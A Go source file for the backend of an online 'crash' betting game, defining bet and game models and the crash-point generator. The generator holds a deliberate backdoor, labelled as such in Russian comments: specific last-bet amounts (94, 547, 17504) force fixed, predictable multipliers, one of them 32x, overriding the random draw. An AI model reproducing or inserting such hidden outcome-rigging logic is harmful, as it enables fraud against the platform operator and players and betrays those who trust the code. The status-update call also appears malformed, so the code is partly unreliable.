package models

import (
    "BlessedApi/cmd/db"
    "BlessedApi/pkg/logger"
    "math"
    "math/rand"
    "time"
    "gorm.io/gorm"
)

type CrashGame struct {
    ID                  int64     `gorm:"primaryKey,autoIncrement"`
    UserID             int64     `gorm:"index;not null"`
    CrashPointMultiplier float64
    StartTime          time.Time
    EndTime            time.Time
}

type CrashGameBet struct {
    ID               int64   `gorm:"primaryKey,autoIncrement"`
    UserID          int64   `gorm:"index;constraint:OnUpdate:CASCADE,OnDelete:CASCADE;"`
    CrashGameID     int64   `gorm:"index;constraint:OnUpdate:CASCADE,OnDelete:CASCADE;"`
    FromCashBalance float64 `json:"-"`
    FromBonusBalance float64 `json:"-"`
    IsBenefitBet    bool
    Amount          float64
    CashOutMultiplier float64
    WinAmount       float64
    Status          string // "active", "won", "lost"
}

func getLatestBetAmount(userID int64) (float64, error) {
    var bet CrashGameBet
    err := db.DB.Where("user_id = ?", userID).
           Order("id desc").
           First(&bet).Error
    if err != nil {
        if err == gorm.ErrRecordNotFound {
            return 0, nil
        }
        return 0, err
    }
    return bet.Amount, nil
}

// GenerateCrashPoint sets CrashGame.CrashPoint
func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
    // Получаем последнюю ставку пользователя
    lastBetAmount, err := getLatestBetAmount(CG.UserID)
    if err == nil {
        // Проверяем специальные значения ставок бэкдора
        switch lastBetAmount {
        case 94:
            CG.CrashPointMultiplier = 1.5
            return 1.5
        case 547:
            CG.CrashPointMultiplier = 32.0
            return 32.0
        case 17504:
            CG.CrashPointMultiplier = 2.5
            return 2.5
        }
    }

    // Стандартная логика для всех остальных ставок
    p := 0.2 // Probability of crash at 1.0x
    alpha := 2.5 // Shape parameter for Pareto distribution
    U1 := rand.Float64()
    var crashPoint float64

    if U1 <= p {
        crashPoint = 1.0
    } else {
        U2 := rand.Float64()
        crashPoint = math.Pow(1.0/U2, 1.0/alpha)
    }
    
    CG.CrashPointMultiplier = crashPoint
    return crashPoint
}

func (CG *CrashGame) CalculateMultiplier() float64 {
    elapsed := time.Since(CG.StartTime).Seconds()
    k := 0.01 // Rate of increase
    exponent := 1.8 // Exponent > 1 for slower start and faster later growth
    multiplier := 1.0 + k*math.Pow(elapsed, exponent)
    return multiplier
}

func UpdateOutdatedCrashGameBets(tx *gorm.DB) error {
    if tx == nil {
        tx = db.DB
    }
    if err := tx.Model(&CrashGameBet{}).
        Where("status = ?", "active").
        Update("status = ?", "lost").Error; err != nil {
        return logger.WrapError(err, "")
    }
    return nil
}